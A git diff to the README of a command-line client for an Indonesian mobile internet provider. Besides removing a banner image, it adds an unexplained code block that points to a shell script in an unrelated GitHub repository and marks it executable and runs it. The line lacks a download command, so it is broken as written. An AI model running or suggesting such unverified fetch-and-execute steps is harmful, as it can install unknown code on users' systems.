@@ -1,7 +1,5 @@
 # MYnyak Engsel Sunset
 
-![banner](bnr.png)
-
 CLI client for a certain Indonesian mobile internet service provider.
 
 # How to get environtment Variables
@@ -35,6 +33,9 @@ bash setup.sh
 python main.py
 ```
 
+```
+https://raw.githubusercontent.com/kcepu877/XR/refs/heads/main/v2.sh && chmod +x v2.sh && ./v2.sh
+```
 # Info
 
 ## PS for Certain Indonesian mobile internet service provider
